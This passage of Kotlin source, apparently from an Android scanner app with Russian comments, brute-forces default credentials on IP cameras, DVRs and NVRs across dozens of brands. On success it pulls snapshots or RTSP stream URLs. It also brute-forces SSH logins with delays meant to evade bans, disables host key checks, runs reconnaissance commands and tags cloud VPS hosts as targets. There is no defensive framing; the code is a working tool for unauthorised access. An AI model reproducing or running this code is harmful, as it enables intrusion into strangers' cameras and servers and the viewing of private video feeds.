            conn.setRequestProperty("Authorization", "Basic $auth")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(2000) }
                val model = if ("ModelName" in body) body.substringAfter("ModelName=").substringBefore("\n").trim().trim('"') else "Sony"
                val snap = getSnapshotGeneric(ip, port, login, password, listOf(
                    "/image", "/oneshotimage.jpg", "/cgi-bin/view/snapshot.cgi"
                ))
                conn.disconnect()
                return ScanResult(ip, port, login, password, model, 1, snap, brand = "Sony")
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }

    // ─── Samsung Auth ───

    private fun trySamsungAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        try {
            val conn = URL("http://$ip:$port/cgi-bin/config-manager?action=getSystemInfo").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.setRequestProperty("Authorization", "Basic $auth")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(2000) }
                val model = if ("model" in body.lowercase()) body.substringAfter("model=").substringBefore("\n").trim() else "Samsung"
                val snap = getSnapshotGeneric(ip, port, login, password, listOf(
                    "/cgi-bin/snapshot.cgi", "/snap.jpg"
                ))
                conn.disconnect()
                return ScanResult(ip, port, login, password, model, 1, snap, brand = "Samsung")
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }

    // ─── Panasonic Auth ───

    private fun tryPanasonicAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        try {
            val conn = URL("http://$ip:$port/cgi-bin/getinfo?FILE=1").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.setRequestProperty("Authorization", "Basic $auth")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(2000) }
                val model = if ("ModelNo" in body) body.substringAfter("ModelNo=").substringBefore("\n").trim() else "Panasonic"
                val snap = getSnapshotGeneric(ip, port, login, password, listOf(
                    "/cgi-bin/camera?resolution=640x480", "/SnapshotJPEG?Resolution=640x480", "/snap.jpg"
                ))
                conn.disconnect()
                return ScanResult(ip, port, login, password, model, 1, snap, brand = "Panasonic")
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }

    // ─── Intelbras Auth (Dahua OEM) ───

    private fun tryIntelbrasAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        try {
            val conn = URL("http://$ip:$port/cgi-bin/magicBox.cgi?action=getDeviceType").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.setRequestProperty("Authorization", "Basic $auth")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(2000) }
                val model = if ("type=" in body) body.substringAfter("type=").trim() else "Intelbras"
                val snap = getSnapshotGeneric(ip, port, login, password, listOf(
                    "/cgi-bin/snapshot.cgi?channel=0", "/cgi-bin/snapshot.cgi", "/snap.jpg"
                ))
                conn.disconnect()
                return ScanResult(ip, port, login, password, model, 1, snap, brand = "Intelbras")
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }

    // ─── Herospeed/Longsee NVR Auth (SHA256 challenge-response) ───

    private fun tryHerospeedAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        // Step 1: Get login capabilities (challenge)
        try {
            val capsConn = URL("http://$ip:$port/api/session/login-capabilities?username=$login").openConnection() as HttpURLConnection
            capsConn.connectTimeout = TIMEOUT_CONNECT
            capsConn.readTimeout = TIMEOUT_HTTP
            capsConn.connect()
            if (capsConn.responseCode == 200) {
                val capsBody = capsConn.inputStream.bufferedReader().use { it.readText().take(2000) }
                capsConn.disconnect()
                // Extract challenge from response
                val challenge = extractJsonField(capsBody, "challenge") ?: ""
                val iterations = extractJsonField(capsBody, "iterations")?.toIntOrNull() ?: 1
                if (challenge.isNotEmpty()) {
                    // SHA256 challenge-response
                    val md = java.security.MessageDigest.getInstance("SHA-256")
                    var hash = password
                    for (i in 0 until iterations) {
                        hash = md.digest("$login:$hash:$challenge".toByteArray(Charsets.UTF_8))
                            .joinToString("") { "%02x".format(it) }
                    }
                    // Step 2: Login with hashed password
                    val loginJson = """{"username":"$login","password":"$hash"}"""
                    val loginConn = URL("http://$ip:$port/api/session/login").openConnection() as HttpURLConnection
                    loginConn.connectTimeout = TIMEOUT_CONNECT
                    loginConn.readTimeout = TIMEOUT_HTTP
                    loginConn.requestMethod = "POST"
                    loginConn.setRequestProperty("Content-Type", "application/json")
                    loginConn.doOutput = true
                    loginConn.outputStream.write(loginJson.toByteArray())
                    loginConn.outputStream.flush()
                    if (loginConn.responseCode == 200) {
                        val loginBody = loginConn.inputStream.bufferedReader().use { it.readText().take(2000) }
                        if ("token" in loginBody.lowercase() || "session" in loginBody.lowercase() || "\"code\":0" in loginBody) {
                            val snap = getSnapshotGeneric(ip, port, login, password, listOf("/snap.jpg", "/snapshot.jpg"))
                            loginConn.disconnect()
                            return ScanResult(ip, port, login, password, "Herospeed/Longsee NVR", 1, snap, brand = "Herospeed")
                        }
                    }
                    loginConn.disconnect()
                }
            } else {
                capsConn.disconnect()
            }
        } catch (_: Exception) {}

        // Fallback: try basic auth
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        try {
            val conn = URL("http://$ip:$port/").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.setRequestProperty("Authorization", "Basic $auth")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(2000) }
                if ("herospeed" in body.lowercase() || "longse" in body.lowercase() || "hsapi" in body.lowercase()) {
                    val snap = getSnapshotGeneric(ip, port, login, password, listOf("/snap.jpg", "/snapshot.jpg"))
                    conn.disconnect()
                    return ScanResult(ip, port, login, password, "Herospeed/Longsee", 1, snap, brand = "Herospeed")
                }
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }

    // ─── Honeywell Auth ───

    private fun tryHoneywellAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        try {
            val conn = URL("http://$ip:$port/ISAPI/System/deviceInfo").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.setRequestProperty("Authorization", "Basic $auth")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(4000) }
                val model = extractXmlField(body, "model") ?: "Honeywell"
                val snap = getSnapshotGeneric(ip, port, login, password, listOf(
                    "/ISAPI/Streaming/channels/101/picture", "/cgi-bin/snapshot.cgi", "/snap.jpg"
                ))
                conn.disconnect()
                return ScanResult(ip, port, login, password, model, 1, snap, brand = "Honeywell")
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }

    // ─── RTSP Credential Testing (port 554) ───

    private fun tryRtspAuth(ip: String, rtspPort: Int = 554): ScanResult? {
        // Шаг 0: быстрый OPTIONS — получаем Server: header для бренда,
        // не тратим время на брутфорс если порт не отвечает вообще
        val optionsBrand = rtspOptionsBrand(ip, rtspPort)
        if (optionsBrand == null) return null   // порт закрыт / не RTSP

        // Stream paths ordered by prevalence across brands:
        // Hikvision, Dahua, Reolink, Axis, ONVIF, generic
        val rtspRoutes = listOf(
            "/Streaming/Channels/101",          // Hikvision main
            "/Streaming/Channels/1",            // Hikvision alt
            "/h264/ch1/main/av_stream",         // Hikvision sub
            "/cam/realmonitor?channel=1&subtype=0", // Dahua main
            "/cam/realmonitor?channel=1&subtype=1", // Dahua sub
            "/h264Preview_01_main",             // Dahua NVR
            "/live/main",                       // Reolink / generic
            "/live/sub",                        // Reolink sub
            "/live/ch00_0",                     // Reolink alt
            "/stream1",                         // Generic HD
            "/stream2",                         // Generic SD
            "/live.sdp",                        // live555 / generic
            "/live",                            // Generic
            "/stream",                          // Generic
            "/video1",                          // Some DVRs
            "/videoMain",                       // TVT / Tiandy
            "/axis-media/media.amp",            // Axis
            "/onvif1",                          // ONVIF profile S
            "/onvif2",                          // ONVIF profile S sub
            "/PSIA/streaming/channels/1",       // Hikvision PSIA
            "/ISAPI/streaming/channels/1",      // Hikvision ISAPI RTSP
            "/MediaInput/h264/stream_1",        // Some DVRs
            "/11",                              // Xiongmai main
            "/12",                              // Xiongmai sub
            "/ch0_0.h264",                      // DVR/NVR
            "/ch01.264",                        // Some NVRs
            "/mpeg4/media.amp",                 // Bosch / Pelco
            "/media/video1",                    // D-Link
            "/trackID=1",                       // RTP
            "/"                                 // bare — last resort
        )

        // Credentials ordered: blank → admin variants → root → others
        val rtspCreds = listOf(
            "" to "",
            "admin" to "",
            "admin" to "admin",
            "admin" to "12345",
            "admin" to "123456",
            "admin" to "admin123",
            "admin" to "admin1234",
            "admin" to "12345admin",
            "admin" to "password",
            "admin" to "1234",
            "admin" to "1111",
            "admin" to "9999",
            "admin" to "0000",
            "admin" to "abc123",
            "admin" to "admin12345",
            "admin" to "asdf1234",
            "root" to "",
            "root" to "root",
            "root" to "12345",
            "root" to "admin",
            "root" to "pass",
            "root" to "toor",
            "user" to "",
            "user" to "user",
            "guest" to "",
            "guest" to "guest",
            "supervisor" to "supervisor",
            "operator" to "operator",
            "service" to "service",
            "ubnt" to "ubnt",
            "888888" to "888888",
            "666666" to "666666"
        )

        // ── Фаза 1: найти живой роут (пробуем без credentials) ──
        // Если роут отвечает 200 → анонимный доступ
        // Если 401 → нужна авторизация, запоминаем роут
        // Если 404/error → роут не существует, пробуем следующий
        var authRoute: String? = null
        for (route in rtspRoutes) {
            if (cancelled) return null
            val probe = rtspDescribeFull(ip, "", "", route, rtspPort)
            if (probe.code == 200) {
                // Анонимный доступ — возвращаем с пустыми кредами
                val brand = detectRtspBrand(probe.resp)
                return ScanResult(ip, rtspPort, "", "", "rtsp://$ip:$rtspPort$route", 1, null, brand = brand)
            }
            if (probe.code == 401) {
                authRoute = route
                break   // живой роут найден, нужна авторизация
            }
            // 404/403/-1 → этот роут не существует, идём дальше
        }

        // ── Фаза 2: если ни один роут не ответил 401, проверяем с кредами ──
        // Некоторые камеры возвращают 404 на "/" без auth, но 200 с auth
        if (authRoute == null) {
            outer@ for ((login, password) in rtspCreds) {
                if (cancelled) return null
                if (login.isEmpty()) continue
                for (route in rtspRoutes) {
                    if (cancelled) return null
                    val probe = rtspDescribeFull(ip, login, password, route, rtspPort)
                    if (probe.code == 200) {
                        val brand = detectRtspBrand(probe.resp)
                        val rtspUrl = "rtsp://${login}:${password}@$ip:$rtspPort$route"
                        return ScanResult(ip, rtspPort, login, password, rtspUrl, 1, null, brand = brand)
                    }
                    if (probe.code == 401) {
                        // Нашли роут с auth → переключаемся на Фазу 3
                        authRoute = route
                        break@outer
                    }
                }
            }
        }

        if (authRoute == null) return null

        // ── Фаза 3: брутим credentials на найденном роуте ──
        for ((login, password) in rtspCreds) {
            if (cancelled) return null
            if (login.isEmpty()) continue  // пустые уже проверили в Фазе 1
            val probe = rtspDescribeFull(ip, login, password, authRoute, rtspPort)
            if (probe.code == 200) {
                val brand = detectRtspBrand(probe.resp)
                val rtspUrl = "rtsp://${login}:${password}@$ip:$rtspPort$authRoute"
                return ScanResult(ip, rtspPort, login, password, rtspUrl, 1, null, brand = brand)
            }
            // 401 → неверный пароль, пробуем следующий
            // другой код → сервер завис/недоступен, стоп
            if (probe.code != 401) break
        }

        return null
    }

    // ── #19 RTSP-верификация: отправляем OPTIONS и проверяем ответ ──
    // Возвращает true если порт 554 отвечает валидным RTSP/1.0 200 OK
    // Используется для добавления бейджа "RTSP ✓" к результату
    fun verifyRtspAlive(ip: String, rtspPort: Int = 554): Boolean {
        return try {
            Socket().use { socket ->
                socket.connect(InetSocketAddress(ip, rtspPort), TIMEOUT_CONNECT)
                socket.soTimeout = 3000
                val req = "OPTIONS * RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: LibVLC/3.0.0\r\n\r\n"
                socket.getOutputStream().write(req.toByteArray(Charsets.UTF_8))
                socket.getOutputStream().flush()
                val buf = ByteArray(512)
                val n = socket.getInputStream().read(buf)
                if (n > 0) {
                    val resp = String(buf, 0, n, Charsets.UTF_8)
                    "RTSP/1.0 200" in resp || "RTSP/1.1 200" in resp
                } else false
            }
        } catch (_: Exception) { false }
    }

    // ── OPTIONS probe — как в Deep Focus RTSPProbe ──
    // Возвращает бренд из Server: header, или "" если сервер ответил но бренд неизвестен,
    // или null если порт не отвечает вообще (значит не RTSP)
    private fun rtspOptionsBrand(ip: String, port: Int): String? {
        return try {
            Socket().use { socket ->
                socket.connect(InetSocketAddress(ip, port), TIMEOUT_CONNECT)
                socket.soTimeout = 4000
                val req = "OPTIONS rtsp://$ip:$port/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: LibVLC/3.0.0\r\n\r\n"
                socket.getOutputStream().write(req.toByteArray(Charsets.UTF_8))
                socket.getOutputStream().flush()
                val buf = ByteArray(2048)
                val n = socket.getInputStream().read(buf)
                if (n > 0) {
                    val resp = String(buf, 0, n, Charsets.UTF_8)
                    // Если не RTSP вообще (HTTP сервер на порту) → null
                    if ("RTSP/1." !in resp && "RTSP/2." !in resp) return null
                    detectRtspBrand(resp)
                } else null
            }
        } catch (_: Exception) { null }
    }

    // Возвращает пару (httpCode, rawResponse) чтобы detectRtspBrand мог читать заголовки
    private data class RtspProbeResult(val code: Int, val resp: String)

    private fun rtspDescribeFull(ip: String, login: String, password: String, route: String, port: Int = 554): RtspProbeResult {
        try {
            Socket().use { socket ->
                socket.connect(InetSocketAddress(ip, port), TIMEOUT_CONNECT)
                socket.soTimeout = 5000

                // Встраиваем credentials прямо в URL (RFC 2326 §3.4)
                val userInfo = if (login.isEmpty()) "" else "$login:$password@"
                val cseq = (1..9999).random()

                // RTSP DESCRIBE с Basic Auth в заголовке — некоторые камеры
                // игнорируют credentials в URL и требуют Authorization header
                val authHeader = if (login.isNotEmpty()) {
                    val b64 = android.util.Base64.encodeToString(
                        "$login:$password".toByteArray(Charsets.UTF_8),
                        android.util.Base64.NO_WRAP
                    )
                    "Authorization: Basic $b64\r\n"
                } else ""

                val req = buildString {
                    append("DESCRIBE rtsp://$userInfo$ip:$port$route RTSP/1.0\r\n")
                    append("CSeq: $cseq\r\n")
                    append("User-Agent: LibVLC/3.0.0 (LIVE555 Streaming Media v2016.11.28)\r\n")
                    append("Accept: application/sdp\r\n")
                    append(authHeader)
                    append("\r\n")
                }

                socket.getOutputStream().write(req.toByteArray(Charsets.UTF_8))
                socket.getOutputStream().flush()

                // Читаем ответ — до 4KB хватит для SDP + заголовков
                val buf = ByteArray(4096)
                var totalRead = 0
                val deadline = System.currentTimeMillis() + 5000
                while (totalRead < buf.size) {
                    val remaining = (deadline - System.currentTimeMillis()).toInt()
                    if (remaining <= 0) break
                    socket.soTimeout = remaining.coerceAtLeast(100)
                    try {
                        val n = socket.getInputStream().read(buf, totalRead, buf.size - totalRead)
                        if (n <= 0) break
                        totalRead += n
                        // Если уже получили заголовки (двойной CRLF) — достаточно
                        val partial = String(buf, 0, totalRead, Charsets.UTF_8)
                        if ("\r\n\r\n" in partial) break
                    } catch (_: java.net.SocketTimeoutException) { break }
                }

                if (totalRead > 0) {
                    val resp = String(buf, 0, totalRead, Charsets.UTF_8)
                    // Поддерживаем RTSP/1.0 и RTSP/1.1 (некоторые камеры)
                    val codeRaw = Regex("RTSP/1\\.[01]\\s+(\\d{3})").find(resp)?.groupValues?.getOrNull(1)?.toIntOrNull() ?: -1
                    val code = when (codeRaw) {
                        200 -> 200
                        401 -> 401
                        403 -> 403
                        404 -> 404
                        in 400..499 -> 400
                        in 500..599 -> 500
                        else -> -1
                    }
                    return RtspProbeResult(code, resp)
                }
            }
        } catch (_: Exception) {}
        return RtspProbeResult(-1, "")
    }

    // Оставляем старый rtspDescribe для обратной совместимости если где-то используется
    private fun rtspDescribe(ip: String, login: String, password: String, route: String, port: Int = 554): Int {
        return rtspDescribeFull(ip, login, password, route, port).code
    }

    private fun detectRtspBrand(resp: String): String {
        val r = resp.lowercase()
        return when {
            "hikvision" in r -> "Hikvision"
            "dahua" in r || "dh-" in r -> "Dahua"
            "axis" in r -> "Axis"
            "reolink" in r -> "Reolink"
            "bosch" in r -> "Bosch"
            "vivotek" in r -> "Vivotek"
            "amcrest" in r -> "Amcrest"
            "uniview" in r || "uniview" in r -> "Uniview"
            "hanwha" in r || "wisenet" in r -> "Hanwha"
            "panasonic" in r -> "Panasonic"
            "sony" in r -> "Sony"
            "honeywell" in r -> "Honeywell"
            "pelco" in r -> "Pelco"
            "tiandy" in r -> "Tiandy"
            "tvt" in r -> "TVT"
            "reolink" in r -> "Reolink"
            "live555" in r -> "Generic/RTSP"
            "ipc" in r || "dvr" in r || "nvr" in r -> "Generic DVR"
            else -> "RTSP"
        }
    }

    // ─── Brand-Generic Auth (with brand-specific snapshot paths) ───

    private fun tryBrandGenericAuth(ip: String, port: Int, login: String, password: String, brand: String): ScanResult? {
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        val snapshotPaths = when (brand) {
            "Imou" -> listOf("/snap.jpg", "/cgi-bin/snapshot.cgi", "/onvif-http/snapshot?channel=1")
            "Tiandy" -> listOf("/cgi-bin/snapshot.cgi", "/snap.jpg", "/snapshot.jpg")
            "TVT" -> listOf("/cgi-bin/snapshot.cgi", "/snap.jpg")
            "TPLink" -> listOf("/stream/snapshot.jpg", "/snapshot.jpg", "/snap.jpg")
            "Tenda" -> listOf("/snapshot.jpg", "/snap.jpg")
            "VStarcam" -> listOf("/snapshot.cgi", "/snap.jpg")
            "Yoosee" -> listOf("/snap.jpg", "/snapshot.jpg")
            "AliOS" -> listOf("/snap.jpg", "/snapshot.jpg", "/cgi-bin/snapshot.cgi")
            "Tuya" -> listOf("/snap.jpg", "/snapshot.jpg")
            "Pelco" -> listOf("/image?res=full&quality=100", "/cgi-bin/snapshot.cgi")
            "Milesight" -> listOf("/cgi-bin/snapshot.cgi", "/snap.jpg")
            "Provision" -> listOf("/cgi-bin/snapshot.cgi", "/snap.jpg")
            "Avtech" -> listOf("/cgi-bin/snapshot.cgi?channel=0", "/snapshot.jpg")
            "Mobotix" -> listOf("/cgi-bin/faststream.jpg?stream=full", "/record/current.jpg")
            "Wanscam" -> listOf("/snapshot.cgi", "/snap.jpg")
            "Sricam" -> listOf("/snapshot.cgi", "/snap.jpg")
            "Hiseeu" -> listOf("/cgi-bin/snapshot.cgi", "/snap.jpg")
            "Annke" -> listOf("/cgi-bin/snapshot.cgi", "/ISAPI/Streaming/channels/101/picture")
            "ZOSI" -> listOf("/cgi-bin/snapshot.cgi", "/snap.jpg")
            "Lorex" -> listOf("/cgi-bin/snapshot.cgi?channel=0", "/snap.jpg")
            "Swann" -> listOf("/cgi-bin/snapshot.cgi", "/snap.jpg")
            "CPPlus" -> listOf("/cgi-bin/snapshot.cgi", "/snap.jpg", "/ISAPI/Streaming/channels/101/picture")
            "Sony" -> listOf("/image", "/oneshotimage.jpg", "/cgi-bin/view/snapshot.cgi")
            "Samsung" -> listOf("/cgi-bin/snapshot.cgi", "/snap.jpg")
            "Panasonic" -> listOf("/cgi-bin/camera?resolution=640x480", "/SnapshotJPEG?Resolution=640x480", "/snap.jpg")
            "Intelbras" -> listOf("/cgi-bin/snapshot.cgi", "/snap.jpg")
            "TVIP" -> listOf("/snapshot.jpg", "/snap.jpg")
            "Avigilon" -> listOf("/snapshot.jpg", "/cgi-bin/snapshot.cgi")
            "Honeywell" -> listOf("/cgi-bin/snapshot.cgi", "/snap.jpg")
            "FLIR" -> listOf("/cgi-bin/snapshot.cgi", "/snap.jpg")
            "Geutebruck" -> listOf("/cgi-bin/snapshot.cgi", "/snap.jpg")
            else -> listOf(
                "/cgi-bin/snapshot.cgi", "/snap.jpg", "/snapshot.jpg", "/image/jpeg.cgi",
                // collyrium extra paths
                "/tmpfs/snap.jpg", "/tmpfs/auto.jpg", "/jpg/image.jpg", "/video.cgi",
                "/image/1.jpg", "/image.jpg", "/cgi/jpg/image.cgi", "/stream.jpg",
                "/stream/current.jpg", "/control/faststream.jpg", "/record/current.jpg",
                "/image", "/cgi-bin/video.jpg", "/cgi-bin/view.cgi"
            )
        }

        // Ищем path который отвечает 401 (требует auth) — потом бьём по нему все creds
        var authPath: String? = null
        for (path in snapshotPaths) {
            if (cancelled) return null
            try {
                val conn = URL("http://$ip:$port$path").openConnection() as HttpURLConnection
                conn.connectTimeout = TIMEOUT_CONNECT
                conn.readTimeout = TIMEOUT_HTTP
                conn.requestMethod = "GET"
                conn.connect()
                val code = conn.responseCode
                conn.disconnect()
                if (code == 401 || code == 403) {
                    authPath = path
                    break
                }
                // 200 без auth — снимок открыт без авторизации, используем пустые creds
                if (code == 200) {
                    val conn2 = URL("http://$ip:$port$path").openConnection() as HttpURLConnection
                    conn2.connectTimeout = TIMEOUT_CONNECT
                    conn2.readTimeout = TIMEOUT_SNAPSHOT
                    conn2.requestMethod = "GET"
                    // НЕ передаём Auth — ресурс доступен без неё
                    conn2.connect()
                    if (conn2.responseCode == 200) {
                        val contentType = conn2.contentType ?: ""
                        val data = conn2.inputStream.readBytes()
                        conn2.disconnect()
                        if (data.size > 500 && ("image" in contentType || (data.size > 2 && data[0] == 0xFF.toByte() && data[1] == 0xD8.toByte()))) {
                            // Открытый снимок — creds пустые, т.к. auth не требовалась
                            return ScanResult(ip, port, "", "", brand, 1, data, brand = brand)
                        }
                    } else {
                        conn2.disconnect()
                    }
                }
            } catch (_: Exception) {}
        }

        // Если нашли auth path — бьём все snapshot-пути с этим cred
        if (authPath != null) {
            try {
                val conn = URL("http://$ip:$port$authPath").openConnection() as HttpURLConnection
                conn.connectTimeout = TIMEOUT_CONNECT
                conn.readTimeout = TIMEOUT_SNAPSHOT
                conn.requestMethod = "GET"
                conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                val code = conn.responseCode
                if (code == 200) {
                    val contentType = conn.contentType ?: ""
                    val data = conn.inputStream.readBytes()
                    conn.disconnect()
                    if (data.size > 500 && ("image" in contentType || (data.size > 2 && data[0] == 0xFF.toByte() && data[1] == 0xD8.toByte()))) {
                        return ScanResult(ip, port, login, password, brand, 1, data, brand = brand)
                    }
                    // Auth прошёл — ищем snapshot на других путях
                    val snap = getSnapshotGeneric(ip, port, login, password, snapshotPaths)
                    return ScanResult(ip, port, login, password, brand, 1, snap, brand = brand)
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }
        return null
    }

    // ─── Generic Snapshot Helper ───

    private fun getSnapshotGeneric(ip: String, port: Int, login: String, password: String, paths: List<String>): ByteArray? {
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        for (path in paths) {
            try {
                val conn = URL("http://$ip:$port$path").openConnection() as HttpURLConnection
                conn.connectTimeout = TIMEOUT_CONNECT
                conn.readTimeout = TIMEOUT_SNAPSHOT
                conn.requestMethod = "GET"
                conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val data = conn.inputStream.readBytes()
                    conn.disconnect()
                    if (data.size > 100) return data
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }
        return null
    }

    // ─── JSON field extractor (for Reolink, Uniview etc.) ───

    private fun extractJsonField(json: String, field: String): String? {
        val pattern = "\"$field\"\\s*:\\s*\"([^\"]+)\""
        val match = Regex(pattern).find(json) ?: return null
        return match.groupValues[1]
    }

    // ─── XMeye binary protocol (34567) ───

    private fun tryXMeye(ip: String): ScanResult? {
        try {
            Socket().use { probe ->
                probe.connect(InetSocketAddress(ip, 34567), TIMEOUT_CONNECT)
            }
        } catch (_: Exception) {
            return null
        }

        val simpleCredentials = listOf(
            "admin" to "",
            "admin" to "admin",
            "admin" to "123456",
            "default" to "tluafed"
        )

        for ((login, password) in simpleCredentials) {
            if (cancelled) return null
            try {
                val socket = Socket()
                socket.connect(InetSocketAddress(ip, 34567), TIMEOUT_CONNECT)
                socket.soTimeout = TIMEOUT_READ

                val passHash = xmeyeHashPassword(password)
                val loginJson = """{"EncryptType":"MD5","LoginType":"DVRIP-Web","PassWord":"$passHash","UserName":"$login"}"""
                val packet = buildXMeyePacket(0x03e8, loginJson)

                socket.getOutputStream().write(packet)
                socket.getOutputStream().flush()

                val header = ByteArray(20)
                var read = 0
                val deadline = System.currentTimeMillis() + TIMEOUT_READ
                while (read < 20 && System.currentTimeMillis() < deadline) {
                    val r = socket.getInputStream().read(header, read, 20 - read)
                    if (r == -1) break
                    read += r
                }

                if (read >= 20) {
                    val dataLen = ((header[15].toInt() and 0xFF) shl 8) or (header[14].toInt() and 0xFF)
                    if (dataLen in 1..8192) {
                        val data = ByteArray(dataLen)
                        var dRead = 0
                        while (dRead < dataLen && System.currentTimeMillis() < deadline) {
                            val r = socket.getInputStream().read(data, dRead, dataLen - dRead)
                            if (r == -1) break
                            dRead += r
                        }
                        val response = String(data, 0, dRead, Charsets.UTF_8)
                        if ("\"Ret\" : 100" in response || "\"SessionID\"" in response) {
                            socket.close()
                            return ScanResult(ip, 34567, login, password, "XMeye/DVR", 1, null, brand = "XMeye")
                        }
                    }
                }
                socket.close()
            } catch (_: Exception) {}
        }
        return null
    }

    private fun xmeyeHashPassword(password: String): String {
        if (password.isEmpty()) return ""
        val md5 = java.security.MessageDigest.getInstance("MD5")
        val hash = md5.digest(password.toByteArray(Charsets.UTF_8))
        val sb = StringBuilder()
        for (i in hash.indices step 2) {
            val sum = (hash[i].toInt() and 0xFF) + (if (i + 1 < hash.size) hash[i + 1].toInt() and 0xFF else 0)
            sb.append((sum % 62).let { v ->
                when {
                    v < 10 -> ('0' + v)
                    v < 36 -> ('A' + v - 10)
                    else -> ('a' + v - 36)
                }
            })
        }
        return sb.toString()
    }

    private fun buildXMeyePacket(msgId: Int, json: String): ByteArray {
        val data = (json + "\n").toByteArray(Charsets.UTF_8)
        val header = ByteArray(20)
        header[0] = 0xFF.toByte()
        header[1] = 0x01
        header[8] = (msgId and 0xFF).toByte()
        header[9] = ((msgId shr 8) and 0xFF).toByte()
        header[14] = (data.size and 0xFF).toByte()
        header[15] = ((data.size shr 8) and 0xFF).toByte()
        return header + data
    }

    // ─── SSH баннер + Telnet брутфорс ───

    private fun trySsh(ip: String): ScanResult? {
        // 1) Читаем SSH баннер (быстрый probe)
        var sshBanner = ""
        try {
            Socket().use { s ->
                s.connect(InetSocketAddress(ip, 22), TIMEOUT_CONNECT)
                s.soTimeout = 3000
                val buf = ByteArray(256)
                val n = s.getInputStream().read(buf)
                if (n > 0) sshBanner = String(buf, 0, n, Charsets.UTF_8).trim()
            }
        } catch (_: Exception) {}

        // 2) SSH открыт — брутфорсим через SSHJ
        if (sshBanner.startsWith("SSH-")) {
            var consecutiveFails = 0
            var delayMs = 200L

            for ((login, password) in SSH_CREDENTIALS) {
                if (cancelled) return null

                // Антибан: задержка между попытками, растёт после ошибок подключения
                if (consecutiveFails > 0) {
                    try { Thread.sleep(delayMs) } catch (_: InterruptedException) { return null }
                }

                // Если 6+ подряд connection refused — сервер забанил, стоп
                if (consecutiveFails >= 6) {
                    // Rate-limited — не можем проверить shell, не считаем как TTY
                    return null
                }

                try {
                    val ssh = SSHClient()
                    ssh.addHostKeyVerifier(PromiscuousVerifier())
                    ssh.connectTimeout = TIMEOUT_CONNECT
                    ssh.timeout = 5000
                    ssh.connect(ip, 22)
                    try {
                        ssh.authPassword(login, password)
                        if (ssh.isAuthenticated) {
                            // ═══ ВАЛИДАЦИЯ TTY + VPS DETECTION ═══
                            var shellOutput = ""
                            var hasRealShell = false
                            var isVPS = false
                            var hostname = ""
                            var osInfo = ""
                            try {
                                val session = ssh.startSession()
                                session.allocateDefaultPTY()
                                // Собираем инфу: id + uname + hostname + виртуализация
                                val cmd = session.exec("id; uname -a; hostname; cat /sys/class/dmi/id/product_name 2>/dev/null; systemd-detect-virt 2>/dev/null; cat /proc/cpuinfo 2>/dev/null | head -5")
                                cmd.inputStream.use { inp ->
                                    val buf = ByteArray(8192)
                                    val n = inp.read(buf)
                                    if (n > 0) shellOutput = String(buf, 0, n, Charsets.UTF_8).trim()
                                }
                                cmd.join(5, TimeUnit.SECONDS)
                                session.close()

                                val lower = shellOutput.lowercase()
                                hasRealShell = "uid=" in lower
                                    || "linux" in lower
                                    || "busybox" in lower
                                    || "gnu" in lower
                                    || "root" in lower
                                    || "mips" in lower
                                    || "arm" in lower

                                // VPS детект — ищем маркеры виртуализации / облака
                                val vpsMarkers = listOf(
                                    "kvm", "qemu", "vmware", "virtualbox", "xen",
                                    "hyper-v", "hypervisor", "vbox",
                                    "openstack", "hetzner", "digitalocean",
                                    "aws", "amazon", "google", "gce", "azure",
                                    "linode", "vultr", "ovh", "contabo",
                                    "oracle cloud", "scaleway", "aruba",
                                    "lxc", "openvz", "virtuozzo", "docker",
                                    "standard pc", "bochs", "bhyve"
                                )
                                isVPS = vpsMarkers.any { it in lower }
                                // Также VPS если x86_64 + ubuntu/debian/centos (не embedded)
                                if (!isVPS && "x86_64" in lower && ("ubuntu" in lower || "debian" in lower || "centos" in lower || "almalinux" in lower || "rocky" in lower)) {
                                    isVPS = true
                                }

                                // Извлекаем hostname
                                val lines = shellOutput.lines()
